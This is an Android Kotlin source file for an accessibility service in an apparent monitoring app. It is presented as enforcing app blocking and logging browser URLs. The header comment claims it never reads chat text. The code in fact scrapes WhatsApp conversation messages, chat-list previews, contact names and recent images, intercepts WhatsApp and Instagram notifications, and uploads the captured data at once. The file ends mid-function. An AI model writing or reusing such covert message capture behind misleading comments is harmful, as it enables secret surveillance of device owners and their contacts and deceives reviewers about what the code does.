package com.spapp.monitoring.blocking

import android.accessibilityservice.AccessibilityService
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.spapp.monitoring.collectors.FileManagerCollector
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.data.local.WebHistoryEntry
import com.spapp.monitoring.data.local.WhatsAppMessageEntry
import com.spapp.monitoring.data.local.InstagramMessageEntry
import com.spapp.monitoring.collectors.WhatsAppNotificationListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale

/**
 * Enforces app_blocking rules (Phase 7) and, when web_history_tracking is
 * on, records the URLs it sees in a supported browser's address bar (Phase
 * 10 — see WebHistoryEntry). Only inspects two things, per the project's
 * transparency principles: (1) which app's window just came to the
 * foreground — the same information Android's own Digital Wellbeing/Family
 * Link use — and (2) the visible address-bar text of supported browsers.
 * It never reads message content, chat text, or any other on-screen
 * content. Both bullets are already listed in the on-device consent text
 * ("Website browsing history", "Device lock and file listing on request").
 *
 * WHY ACCESSIBILITY, NOT A CONTENT PROVIDER QUERY: modern Chrome exposes no
 * history API to third-party apps at all (removed from the public SDK years
 * ago) — there is no supported way to read it without this. Address-bar
 * inspection only works for browsers that expose a stable accessibility
 * resource-id for their URL bar, listed below; an unsupported or updated
 * browser simply won't be covered, for blocking or for history, while
 * app-level blocking (blocking a browser entirely) still works regardless.
 *
 * EVENT SUBSCRIPTION — ONLY typeWindowStateChanged (see
 * accessibility_service_config.xml), deliberately. An earlier version also
 * subscribed to typeWindowContentChanged to catch in-page navigation within
 * a browser (switching sites without leaving the window never fires
 * typeWindowStateChanged). That event type fires constantly for every app's
 * every UI redraw system-wide — there is no way to scope it to "only
 * browsers" at the OS subscription level without also scoping
 * typeWindowStateChanged the same way (AccessibilityServiceInfo.packageNames
 * applies to all subscribed event types together, not per type), which would
 * risk silently losing the very event app-blocking depends on for every
 * other app. The flood of extra events was the suspected cause of app
 * blocking becoming intermittent (worked twice, then silently didn't) after
 * that change. Reverted — in-page navigation is now covered by a short
 * polling loop (see browserPollRunnable) that only runs while a browser is
 * confirmed foreground, so it costs nothing for any other app and never
 * touches the service's OS-level event subscription.
 */
class BlockAccessibilityService : AccessibilityService() {

    companion object {
        @Volatile
        var instance: BlockAccessibilityService? = null
            private set
    }

    private lateinit var rulesCache: BlockRulesCache
    private var lastBlockedPackage: String? = null
    private var lastBlockedAt = 0L
    private var lastRecordedUrl: String? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val pollHandler = Handler(Looper.getMainLooper())
    private var browserPollRunnable: Runnable? = null
    private val browserPollIntervalMs = 1500L

    private val browserUrlBarIds = setOf(
        "com.android.chrome:id/url_bar",
        "com.google.android.apps.chrome:id/url_bar",
        "com.brave.browser:id/url_bar",
        "org.mozilla.firefox:id/mozac_browser_toolbar_url_view",
        "com.microsoft.emmx:id/url_bar",
    )
    private val browserPackages = browserUrlBarIds.map { it.substringBefore(":id/") }.toSet()

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        try {
            val info = serviceInfo ?: android.accessibilityservice.AccessibilityServiceInfo()
            info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_SCROLLED
            info.feedbackType = android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC
            info.flags = info.flags or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            serviceInfo = info
        } catch (e: Exception) {
            Log.e("BlockA11y", "Failed to configure serviceInfo dynamically", e)
        }
        rulesCache = BlockRulesCache(applicationContext)
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = event.eventType
        val packageName = event.packageName?.toString() ?: return
        if (packageName == applicationContext.packageName) return // never block ourselves

        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val notification = event.parcelableData as? android.app.Notification
            val eventTexts = try { event.text?.mapNotNull { it?.toString()?.trim() }?.filter { it.isNotBlank() } } catch (_: Exception) { null }
            val postTime = if (notification != null && notification.`when` > 0) notification.`when` else System.currentTimeMillis()
            if (packageName == "com.instagram.android" || packageName == "com.instagram.lite" || packageName.contains("instagram")) {
                com.spapp.monitoring.collectors.WhatsAppNotificationListener.processInstagramNotificationData(
                    applicationContext,
                    notification,
                    postTime,
                    packageName,
                    fallbackTexts = eventTexts
                )
            } else if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                if (notification != null) {
                    com.spapp.monitoring.collectors.WhatsAppNotificationListener.processWhatsAppNotificationData(
                        applicationContext,
                        notification,
                        postTime,
                        packageName
                    )
                }
            }
            return
        }

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (packageName in browserPackages) {
                recordUrlIfEnabled(event, rootInActiveWindow)
                checkWebsiteRules()
                startBrowserPolling()
            } else {
                stopBrowserPolling()
            }

            if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                startWhatsAppPolling()
            } else {
                stopWhatsAppPolling()
            }

            if (packageName == "com.instagram.android") {
                detectAndHandleInstagramAccountSwitch(rootInActiveWindow)
                startInstagramPolling()
            } else {
                stopInstagramPolling()
            }

            checkAppRule(packageName)
        }

        // Real-time WhatsApp capture:
        // Trigger immediately when user taps (e.g. clicks Send button), when messages appear on screen,
        // when scrolling through chats/conversation, or when window state changes
        if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val nodeToInspect = rootInActiveWindow ?: event.source
                recordWhatsAppChatIfForeground(nodeToInspect)
            }
        }

        // Real-time Instagram Direct capture & in-app account switch detection:
        if (packageName == "com.instagram.android") {
            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                checkAccountSwitcherClick(event.source, rootInActiveWindow)
            }
            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val nodeToInspect = rootInActiveWindow ?: event.source
                recordInstagramChatIfForeground(nodeToInspect)
            }
        }
    }

    /**
     * Periodically inspects WhatsApp's active conversation window while WhatsApp is foreground.
     */
    private var whatsAppPollRunnable: Runnable? = null
    private val whatsAppPollIntervalMs = 2000L
    private val capturedWhatsAppMsgHashes = mutableSetOf<String>()

    private fun startWhatsAppPolling() {
        if (whatsAppPollRunnable != null) return
        val runnable = object : Runnable {
            override fun run() {
                recordWhatsAppChatIfForeground(rootInActiveWindow)
                pollHandler.postDelayed(this, whatsAppPollIntervalMs)
            }
        }
        whatsAppPollRunnable = runnable
        pollHandler.postDelayed(runnable, 500L)
    }

    private fun stopWhatsAppPolling() {
        whatsAppPollRunnable?.let { pollHandler.removeCallbacks(it) }
        whatsAppPollRunnable = null
    }

    fun recordWhatsAppChatIfForeground(root: AccessibilityNodeInfo?) {
        if (root == null) return
        try {
            val entriesToInsert = mutableListOf<WhatsAppMessageEntry>()
            val now = System.currentTimeMillis()

            fun collectTexts(node: AccessibilityNodeInfo?): List<String> {
                if (node == null) return emptyList()
                val list = mutableListOf<String>()
                fun walk(n: AccessibilityNodeInfo?) {
                    if (n == null) return
                    val t = n.text?.toString()?.trim()
                    if (!t.isNullOrBlank()) {
                        list.add(t)
                    }
                    for (i in 0 until n.childCount) {
                        walk(n.getChild(i))
                    }
                }
                walk(node)
                return list
            }

            fun isTimeOrDate(s: String): Boolean {
                val trimmed = s.trim()
                return trimmed.matches(Regex("^[0-9]{1,2}:[0-9]{2}(\\s*[AaPpMm]{2})?$")) ||
                       trimmed.equals("yesterday", ignoreCase = true) ||
                       trimmed.equals("today", ignoreCase = true) ||
                       trimmed.matches(Regex("^[0-9]{1,2}[/.-][0-9]{1,2}([/.-][0-9]{2,4})?$")) ||
                       trimmed in setOf("Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday")
            }

            fun isSystemLabel(s: String): Boolean {
                val trimmed = s.trim().lowercase()
                return trimmed in setOf(
                    "whatsapp", "whatsapp business", "chats", "updates", "calls", "communities",
                    "settings", "search", "archived", "unread", "groups", "all", "type a message",
                    "message", "status", "delivered", "read", "navigate up", "back", "more options",
                    "call", "video call", "voice call", "online", "typing...", "typing", "audio call",
                    "ask meta ai or search", "ask meta ai", "meta ai", "floating windows",
                    "search unread chats", "not interested", "interested", "reels", "follow",
                    "recent contact", "recent conversation", "tap to view conversation"
                )
            }

            fun isBadge(s: String): Boolean {
                val trimmed = s.trim()
                return trimmed.matches(Regex("^[0-9]+$")) && (trimmed.toIntOrNull() ?: 0) in 1..999
            }

            fun parseBubbleTime(timeStr: String?): Long {
                if (timeStr.isNullOrBlank()) return now
                try {
                    val clean = timeStr.trim().uppercase()
                    val calendar = java.util.Calendar.getInstance()
                    val format = if (clean.contains("AM") || clean.contains("PM")) {
                        java.text.SimpleDateFormat("h:mm a", java.util.Locale.US)
                    } else {
                        java.text.SimpleDateFormat("HH:mm", java.util.Locale.US)
                    }
                    val parsed = format.parse(clean)
                    if (parsed != null) {
                        val parsedCal = java.util.Calendar.getInstance().apply { time = parsed }
                        calendar.set(java.util.Calendar.HOUR_OF_DAY, parsedCal.get(java.util.Calendar.HOUR_OF_DAY))
                        calendar.set(java.util.Calendar.MINUTE, parsedCal.get(java.util.Calendar.MINUTE))
                        calendar.set(java.util.Calendar.SECOND, 0)
                        calendar.set(java.util.Calendar.MILLISECOND, 0)
                        if (calendar.timeInMillis > now + 300_000) {
                            calendar.add(java.util.Calendar.DAY_OF_YEAR, -1)
                        }
                        return calendar.timeInMillis
                    }
                } catch (_: Exception) {}
                return now
            }

            fun hasConversationInput(node: AccessibilityNodeInfo?): Boolean {
                if (node == null) return false
                if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return true
                for (i in 0 until node.childCount) {
                    if (hasConversationInput(node.getChild(i))) return true
                }
                return false
            }

            val displayMetrics = resources.displayMetrics
            val screenWidth = displayMetrics.widthPixels
            val isInOpenConversation = hasConversationInput(root)

            if (isInOpenConversation) {
                // =============================================================
                // 1. OPEN CONVERSATION SCREEN: Capture active chat messages
                // =============================================================
                var chatTitle: String? = null
                val titleIdCandidates = listOf(
                    "com.whatsapp:id/conversation_contact_name",
                    "com.whatsapp.w4b:id/conversation_contact_name",
                    "com.whatsapp:id/conversation_title",
                    "com.whatsapp.w4b:id/conversation_title",
                    "com.whatsapp:id/action_bar_title",
                    "com.whatsapp.w4b:id/action_bar_title",
                    "com.whatsapp:id/contact_title",
                    "com.whatsapp.w4b:id/contact_title",
                    "com.whatsapp:id/user_name",
                    "com.whatsapp:id/title"
                )
                for (id in titleIdCandidates) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    if (!nodes.isNullOrEmpty()) {
                        val candidate = nodes[0].text?.toString()?.trim()
                        if (!candidate.isNullOrBlank() && !isSystemLabel(candidate) && !isTimeOrDate(candidate)) {
                            chatTitle = candidate
                            break
                        }
                    }
                }

                // Fallback: scan top action bar area (top 380px)
                if (chatTitle.isNullOrBlank()) {
                    val headerNodes = mutableListOf<AccessibilityNodeInfo>()
                    fun findHeader(node: AccessibilityNodeInfo?) {
                        if (node == null) return
                        val rect = Rect()
                        node.getBoundsInScreen(rect)
                        if (rect.top < 380 && node.text != null && node.text.isNotBlank()) {
                            headerNodes.add(node)
                        }
                        for (i in 0 until node.childCount) {
                            findHeader(node.getChild(i))
                        }
                    }
                    findHeader(root)
                    chatTitle = headerNodes.firstOrNull {
                        val s = it.text.toString().trim()
                        !isSystemLabel(s) && !isTimeOrDate(s) && !isBadge(s) && !s.contains("online") && !s.contains("last seen") && s.length < 50
                    }?.text?.toString()?.trim()
                }

                if (!chatTitle.isNullOrBlank()) {
                    val msgIdList = listOf(
                        "com.whatsapp:id/message_text",
                        "com.whatsapp.w4b:id/message_text",
                        "com.whatsapp:id/caption",
                        "com.whatsapp.w4b:id/caption",
                        "com.whatsapp:id/conversation_text",
                        "com.whatsapp.w4b:id/conversation_text",
                        "com.whatsapp:id/msg_text",
                        "com.whatsapp.w4b:id/msg_text",
                        "com.whatsapp:id/text",
                        "com.whatsapp:id/message_body"
                    )
                    var messageNodes: List<AccessibilityNodeInfo>? = null
                    for (id in msgIdList) {
                        val nodes = root.findAccessibilityNodeInfosByViewId(id)
                        if (!nodes.isNullOrEmpty()) {
                            messageNodes = nodes
                            break
                        }
                    }

                    if (messageNodes.isNullOrEmpty()) {
                        val textList = mutableListOf<AccessibilityNodeInfo>()
                        fun collectMessageTexts(node: AccessibilityNodeInfo?) {
                            if (node == null) return
                            if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
                            val t = node.text?.toString()?.trim()
                            val rect = Rect()
                            node.getBoundsInScreen(rect)
                            if (!t.isNullOrBlank() && !isTimeOrDate(t) && !isSystemLabel(t) && rect.top > 120 && rect.bottom <= (displayMetrics.heightPixels - 100)) {
                                if (t != chatTitle && !t.contains("end-to-end encrypted") &&
                                    !t.equals("Type a message", ignoreCase = true) &&
                                    !t.equals("Message", ignoreCase = true)) {
                                    textList.add(node)
                                }
                            }
                            for (i in 0 until node.childCount) {
                                collectMessageTexts(node.getChild(i))
                            }
                        }
                        collectMessageTexts(root)
                        if (textList.isNotEmpty()) {
                            messageNodes = textList
                        }
                    }

                    if (!messageNodes.isNullOrEmpty()) {
                        for (node in messageNodes) {
                            if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) continue
                            val text = node.text?.toString()?.trim() ?: continue
                            if (text.isBlank() || isTimeOrDate(text) || isSystemLabel(text)) continue
                            if (text.equals("Type a message", ignoreCase = true) || text.equals("Message", ignoreCase = true)) continue

                            val rect = Rect()
                            node.getBoundsInScreen(rect)
                            val parentRect = Rect()
                            node.parent?.getBoundsInScreen(parentRect)

                            val isOutgoing = (parentRect.right >= screenWidth - 120 && parentRect.left > 80) ||
                                             (rect.right >= screenWidth * 0.72) ||
                                             (rect.centerX() > screenWidth * 0.48)

                            var bubbleTimeMs = (now / 60_000) * 60_000
                            try {
                                val parent = node.parent
                                if (parent != null) {
                                    val siblingTexts = collectTexts(parent)
                                    val timeText = siblingTexts.firstOrNull { isTimeOrDate(it) }
                                    if (timeText != null) {
                                        bubbleTimeMs = parseBubbleTime(timeText)
                                    } else {
                                        val grandTexts = collectTexts(parent.parent)
                                        val grandTime = grandTexts.firstOrNull { isTimeOrDate(it) }
                                        if (grandTime != null) {
                                            bubbleTimeMs = parseBubbleTime(grandTime)
                                        }
                                    }
                                }
                            } catch (_: Exception) {}

                            var mediaType: String? = null
                            var mediaPath: String? = null
                            if (text.contains("📷") || text.contains("Photo", ignoreCase = true) || text.contains("View photo", ignoreCase = true)) {
                                mediaType = "image"
                                try {
                                    mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
                                } catch (_: Exception) {}
                            }

                            val dedupeKey = "MSG|$chatTitle|$text|$isOutgoing|$bubbleTimeMs"
                            if (capturedWhatsAppMsgHashes.contains(dedupeKey)) continue
                            capturedWhatsAppMsgHashes.add(dedupeKey)
                            if (capturedWhatsAppMsgHashes.size > 2000) {
                                capturedWhatsAppMsgHashes.clear()
                            }

                            entriesToInsert += WhatsAppMessageEntry(
                                chatName = chatTitle,
                                sender = if (isOutgoing) "me" else chatTitle,
                                messageText = text,
                                isOutgoing = isOutgoing,
                                messageTimeEpochMs = bubbleTimeMs,
                                mediaType = mediaType,
                                mediaPath = mediaPath
                            )
                        }
                    }
                }
            } else {
                // =============================================================
                // 2. CHATS LIST SCREEN: Capture all conversation rows & snippets
                // =============================================================
                val rowContactCandidates = listOf(
                    "com.whatsapp:id/conversations_row_contact_name",
                    "com.whatsapp.w4b:id/conversations_row_contact_name",
                    "com.whatsapp:id/conversations_row_title",
                    "com.whatsapp.w4b:id/conversations_row_title",
                    "com.whatsapp:id/conversations_contact_name",
                    "com.whatsapp.w4b:id/conversations_contact_name",
                    "com.whatsapp:id/chat_title",
                    "com.whatsapp.w4b:id/chat_title",
                    "com.whatsapp:id/contact_name",
                    "com.whatsapp.w4b:id/contact_name"
                )
                var rowContactNodes: List<AccessibilityNodeInfo>? = null
                for (id in rowContactCandidates) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    if (!nodes.isNullOrEmpty()) {
                        rowContactNodes = nodes
                        break
                    }
                }

                if (!rowContactNodes.isNullOrEmpty()) {
                    for (node in rowContactNodes) {
                        val name = node.text?.toString()?.trim() ?: continue
                        if (name.isBlank() || isSystemLabel(name) || isTimeOrDate(name)) continue

                        // Look inside the conversation row container for preview message and time
                        var preview: String? = null
                        var rowTimeMs = now
                        var isRowOutgoing = false
                        try {
                            var container: AccessibilityNodeInfo? = node.parent
                            var depth = 0
                            while (container != null && depth < 5) {
                                val r = Rect()
                                container.getBoundsInScreen(r)
                                if (r.width() > screenWidth * 0.7 && (container.isClickable || r.height() in 80..400)) {
                                    break
                                }
                                container = container.parent
                                depth++
                            }
                            if (container == null) container = node.parent?.parent ?: node.parent

                            if (container != null) {
                                val snippetIds = listOf(
                                    "com.whatsapp:id/conversations_row_snippet",
                                    "com.whatsapp.w4b:id/conversations_row_snippet",
                                    "com.whatsapp:id/single_msg_tv",
                                    "com.whatsapp.w4b:id/single_msg_tv",
                                    "com.whatsapp:id/msg_from_tv",
                                    "com.whatsapp:id/last_message"
                                )
                                for (snipId in snippetIds) {
                                    val snipNodes = container.findAccessibilityNodeInfosByViewId(snipId)
                                    if (!snipNodes.isNullOrEmpty()) {
                                        val sText = snipNodes[0].text?.toString()?.trim()
                                        if (!sText.isNullOrBlank() && !isSystemLabel(sText) && !isTimeOrDate(sText) && !isBadge(sText)) {
                                            preview = sText
                                            break
                                        }
                                    }
                                }
                                val texts = collectTexts(container)
                                val timeText = texts.firstOrNull { isTimeOrDate(it) }
                                if (timeText != null) {
                                    rowTimeMs = parseBubbleTime(timeText)
                                }
                                if (preview == null) {
                                    preview = texts.firstOrNull { it != name && !isTimeOrDate(it) && !isBadge(it) && !isSystemLabel(it) && it.length > 1 }
                                }
                                if (preview?.startsWith("You: ", ignoreCase = true) == true) {
                                    isRowOutgoing = true
                                    preview = preview.substring(5).trim()
                                }
                            }
                        } catch (_: Exception) {}

                        if (!preview.isNullOrBlank() && preview != "Recent conversation" && !isSystemLabel(preview)) {
                            val dedupeKey = "ROW|$name|$preview|$rowTimeMs"
                            if (!capturedWhatsAppMsgHashes.contains(dedupeKey)) {
                                capturedWhatsAppMsgHashes.add(dedupeKey)
                                if (capturedWhatsAppMsgHashes.size > 2000) capturedWhatsAppMsgHashes.clear()
                                entriesToInsert += WhatsAppMessageEntry(
                                    chatName = name,
                                    sender = if (isRowOutgoing) "me" else name,
                                    messageText = preview,
                                    isOutgoing = isRowOutgoing,
                                    messageTimeEpochMs = rowTimeMs
                                )
                            }
                        }
                    }
                } else {
                    // Fallback row container search when view IDs are obfuscated
                    val candidateRows = mutableListOf<AccessibilityNodeInfo>()
                    fun findChatRows(node: AccessibilityNodeInfo?) {
                        if (node == null) return
                        val count = node.childCount
                        val rect = Rect()
                        node.getBoundsInScreen(rect)
                        val w = rect.width()
                        val h = rect.height()
                        if ((node.isClickable || count in 1..10) && w > (screenWidth * 0.5) && h in 70..420) {
                            val texts = collectTexts(node)
                            if (texts.size >= 2 && texts.any { !isTimeOrDate(it) && !isSystemLabel(it) && !isBadge(it) }) {
                                candidateRows.add(node)
                            }
                        }
                        for (i in 0 until count) {
                            findChatRows(node.getChild(i))
                        }
                    }
                    findChatRows(root)

                    for (row in candidateRows) {
                        val texts = collectTexts(row)
                        val candidateTitles = texts.filter {
                            !isTimeOrDate(it) && !isSystemLabel(it) && !isBadge(it) && it.length <= 50
                        }
                        if (candidateTitles.isNotEmpty()) {
                            val title = candidateTitles.first()
                            var snippet = texts.firstOrNull { it != title && !isTimeOrDate(it) && !isBadge(it) && !isSystemLabel(it) }
                            val timeText = texts.firstOrNull { isTimeOrDate(it) }
                            val rowTimeMs = if (timeText != null) parseBubbleTime(timeText) else now

                            var isSnippetOutgoing = false
                            if (snippet?.startsWith("You: ", ignoreCase = true) == true) {
                                isSnippetOutgoing = true
                                snippet = snippet.substring(5).trim()
                            }

                            if (!snippet.isNullOrBlank() && snippet != "Recent conversation" && !isSystemLabel(snippet)) {
                                val dedupeKey = "ROW|$title|$snippet|$rowTimeMs"
                                if (!capturedWhatsAppMsgHashes.contains(dedupeKey)) {
                                    capturedWhatsAppMsgHashes.add(dedupeKey)
                                    if (capturedWhatsAppMsgHashes.size > 2000) capturedWhatsAppMsgHashes.clear()
                                    entriesToInsert += WhatsAppMessageEntry(
                                        chatName = title,
                                        sender = if (isSnippetOutgoing) "me" else title,
                                        messageText = snippet,
                                        isOutgoing = isSnippetOutgoing,
                                        messageTimeEpochMs = rowTimeMs
                                    )
                                }
                            }
                        }
                    }
                }
            }

            if (entriesToInsert.isNotEmpty()) {
                scope.launch {
                    try {
                        val db = AppDatabase.getInstance(applicationContext)
                        db.whatsAppMessageDao().insertAll(entriesToInsert)
                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                    } catch (e: Exception) {
                        Log.e("BlockA11y", "Failed to insert captured WhatsApp messages", e)
                    }
                }
            }
        } catch (_: Exception) {
        }
    }

    private var instagramPollRunnable: Runnable? = null
    private fun startInstagramPolling() {
        if (instagramPollRunnable != null) return
        val runnable = object : Runnable {
            override fun run() {
                recordInstagramChatIfForeground(rootInActiveWindow)
                pollHandler.postDelayed(this, 2000L)
            }
        }
        instagramPollRunnable = runnable
        pollHandler.postDelayed(runnable, 500L)
    }

    private fun stopInstagramPolling() {
        instagramPollRunnable?.let { pollHandler.removeCallbacks(it) }
        instagramPollRunnable = null
    }

    /**
     * Checks if a tapped node in com.instagram.android belongs to the in-app Account Switcher sheet.
     * Fires immediately when the user taps an account row to switch — ZERO reliance on toast messages!
     */
    private fun checkAccountSwitcherClick(clicked: AccessibilityNodeInfo?, root: AccessibilityNodeInfo?) {
        if (clicked == null) return
        try {
            val texts = mutableListOf<String>()
            fun collect(n: AccessibilityNodeInfo?) {
                if (n == null) return
                n.text?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                n.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                n.hintText?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                for (i in 0 until n.childCount) {
                    collect(n.getChild(i))
                }
            }
            collect(clicked)
            clicked.parent?.let { parent ->
                for (i in 0 until parent.childCount) {
                    val child = parent.getChild(i)
                    child?.text?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                    child?.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                }
            }

            val reserved = setOf(
                "instagram", "switch accounts", "add account", "log in", "accounts", "cancel", "done",
                "close", "choose an account", "log out", "settings", "edit profile", "share profile"
            )
            for (t in texts) {
                val clean = t.removePrefix("@").trim().lowercase()
                if (clean.length in 3..32 &&
                    clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                    !clean.matches("^[0-9]+$".toRegex()) &&
                    !reserved.contains(clean)
                ) {
                    Log.i("BlockA11y", ">>> Account Switcher tapped row detected: '$clean'")
                    notifyInstagramAccountDetected(clean)
                    break
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Public handler called whenever an active Instagram account username is detected from ANY source
     * (Home feed comment box, account switcher click, bottom navigation tab, or notification subtext).
     * Compares against current account and notifies backend immediately.
     */
    fun notifyInstagramAccountDetected(detectedUsername: String) {
        // Disabled per user requirement: do not find or track login ID
    }

    fun detectAndHandleInstagramAccountSwitch(root: AccessibilityNodeInfo?) {
        if (root == null) return
        return
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.instagram.android") return

        try {
            val allTexts = mutableListOf<String>()
            val topCandidates = mutableListOf<Pair<String, Rect>>()
            val viewIdCandidates = mutableListOf<String>()

            fun traverseNodes(node: AccessibilityNodeInfo?) {
                if (node == null) return

                val t = node.text?.toString()?.trim()
                if (!t.isNullOrBlank()) {
                    allTexts.add(t)
                    val r = Rect()
                    node.getBoundsInScreen(r)
                    if (r.top < 500 && r.height() in 15..250) {
                        topCandidates.add(Pair(t, r))
                    }
                }

                val cd = node.contentDescription?.toString()?.trim()
                if (!cd.isNullOrBlank()) {
                    allTexts.add(cd)
                    val r = Rect()
                    node.getBoundsInScreen(r)
                    if (r.top < 500 && r.height() in 15..250) {
                        topCandidates.add(Pair(cd, r))
                    }
                }

                // Crucial for Instagram feed posts & reels: hintText = "Add a comment as <username>..."
                val hint = node.hintText?.toString()?.trim()
                if (!hint.isNullOrBlank()) {
                    allTexts.add(hint)
                }

                val vId = node.viewIdResourceName
                if (!vId.isNullOrBlank()) {
                    if (vId.endsWith(":id/row_user_primary_name") ||
                        vId.endsWith(":id/action_bar_title") ||
                        vId.endsWith(":id/action_bar_large_title") ||
                        vId.endsWith(":id/action_bar_textview_title") ||
                        vId.endsWith(":id/username") ||
                        vId.endsWith(":id/profile_tab")
                    ) {
                        val txt = node.text?.toString()?.trim() ?: node.contentDescription?.toString()?.trim()
                        if (!txt.isNullOrBlank()) {
                            viewIdCandidates.add(txt)
                        }
                    }
                }

                for (i in 0 until node.childCount) {
                    traverseNodes(node.getChild(i))
                }
            }
            traverseNodes(root)

            var detectedUsername: String? = null

            val reserved = setOf(
                "instagram", "direct", "messages", "search", "explore", "reels", "threads",
                "meta", "camera", "chats", "calls", "following", "followers", "edit profile",
                "share profile", "notifications", "settings", "activity", "close friends",
                "posts", "saved", "archive", "qr code", "audio", "video", "primary", "general",
                "requests", "notes", "new message", "create", "options", "more options", "back",
                "professional dashboard", "tools", "insights", "ad tools", "switch accounts",
                "add account", "log in", "log out", "accounts", "profile", "home", "search & explore",
                "uninstall", "security", "music", "danger", "tab", "double tap", "like", "reply",
                "send", "view", "comment"
            )

            // STRATEGY 1: Feed / Post / Reels Comment Box Placeholder (e.g. "Add a comment as <username>...", "Comment as <username>...")
            // On Instagram Home Feed, every post has a comment box with this exact placeholder!
            // Directly works on the Home Feed without user clicking Profile or Message icon!
            for (text in allTexts) {
                val match = "(?i)(?:add\\s+a\\s+comment\\s+as|comment\\s+as|replying\\s+as|posting\\s+as|sharing\\s+as|logged\\s+in\\s+as|signed\\s+in\\s+as|continue\\s+as)\\s+@?([a-zA-Z0-9._]+)".toRegex().find(text)
                if (match != null) {
                    val candidate = match.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                    if (candidate.length in 3..32 && !reserved.contains(candidate) && candidate.matches("^[a-zA-Z0-9._]+$".toRegex())) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            // STRATEGY 2: In-App Account Switcher Dialog / Bottom Sheet
            // When user switches accounts via long-press profile or chevron, the switcher sheet lists accounts directly.
            val isSwitcherSheet = allTexts.any {
                it.contains("Switch accounts", ignoreCase = true) ||
                it.contains("Choose an account", ignoreCase = true) ||
                it.contains("Add account", ignoreCase = true) ||
                it.contains("Log into existing account", ignoreCase = true)
            }
            if (detectedUsername == null && isSwitcherSheet) {
                for (cand in viewIdCandidates + allTexts) {
                    val clean = cand.removePrefix("@").trim().lowercase()
                    if (clean.length in 3..32 &&
                        clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !clean.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(clean)
                    ) {
                        detectedUsername = clean
                        break
                    }
                }
            }

            // STRATEGY 3: Bottom Navigation Bar Profile Tab ContentDescription
            // e.g. "Profile for <user>", "<user>'s profile"
            if (detectedUsername == null) {
                for (text in allTexts) {
                    val match1 = "(?i)(?:profile\\s+(?:for|of|tab)?\\s*[:,-]?\\s*@?([a-zA-Z0-9._]+))".toRegex().find(text)
                    if (match1 != null) {
                        val candidate = match1.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                        if (candidate.length in 3..32 && !reserved.contains(candidate) && !candidate.startsWith("tab") && !candidate.matches("^[0-9]+$".toRegex())) {
                            detectedUsername = candidate
                            break
                        }
                    }
                    val match2 = "(?i)@?([a-zA-Z0-9._]+)(?:'s)?\\s+profile(?:,\\s*tab)?".toRegex().find(text)
                    if (match2 != null) {
                        val candidate = match2.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                        if (candidate.length in 3..32 && !reserved.contains(candidate) && !candidate.startsWith("tab") && !candidate.matches("^[0-9]+$".toRegex())) {
                            detectedUsername = candidate
                            break
                        }
                    }
                }
            }

            // STRATEGY 4: Action Bar Title / View IDs (e.g. action_bar_title)
